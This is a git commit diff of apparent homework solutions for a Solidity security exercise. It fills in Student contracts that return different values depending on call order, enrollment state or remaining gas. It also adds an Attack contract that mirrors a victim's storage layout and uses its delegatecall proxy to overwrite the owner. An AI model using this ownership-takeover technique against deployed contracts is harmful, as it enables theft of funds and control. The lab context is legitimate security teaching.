784a604124747455eeaa21cfac15e7836b88c0c7
hsu5211 <ugean931125@gmail.com>
2024-03-21 22:00:53 +0800

    done

--- hw1/src/Classroom/Classroom.sol
+++ hw1/src/Classroom/Classroom.sol
@@ -4,9 +4,11 @@ pragma solidity ^0.8.0;
 /* Problem 1 Interface & Contract */
 contract StudentV1 {
     // Note: You can declare some state variable
-
+    bool public first = true;
     function register() external returns (uint256) {
         // TODO: please add your implementaiton here
+        if(first){first = false;return 1001;}
+        else return 123;
     }
 }
 
@@ -15,9 +17,12 @@ interface IClassroomV2 {
     function isEnrolled() external view returns (bool);
 }
 
-contract StudentV2 {
+contract StudentV2{  
     function register() external view returns (uint256) {
         // TODO: please add your implementaiton here
+        if(IClassroomV2(msg.sender).isEnrolled()) return 123;
+        else return 1001;
+
     }
 }
 
@@ -25,5 +30,7 @@ contract StudentV2 {
 contract StudentV3 {
     function register() external view returns (uint256) {
         // TODO: please add your implementaiton here
+        if(gasleft() < 7000) return 123;
+        else return 1001;
     }
 }
--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -7,19 +7,32 @@ interface ID31eg4t3 {
 }
 
 contract Attack {
-    address internal immutable victim;
-    // TODO: Declare some variable here
-    // Note: Checkout the storage layout in victim contract
+    uint256 var0 = 12345;
+    uint8 var1 = 32;
+    string private var2;
+    address private var3;
+    uint8 private var4;
+    address public owner;
+    mapping(address => bool) public result;
 
+    address internal immutable victim;
+    
     constructor(address addr) payable {
         victim = addr;
     }
 
     // NOTE: You might need some malicious function here
+    function ChangeOwner() public{
+        owner = tx.origin;
+        result[owner] = true;
+    }
 
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+        bytes memory data = abi.encodeWithSignature("ChangeOwner()");
+        //(bool success, ) = address(victim).call(data);
+        ID31eg4t3(victim).proxyCall(data);
     }
 }
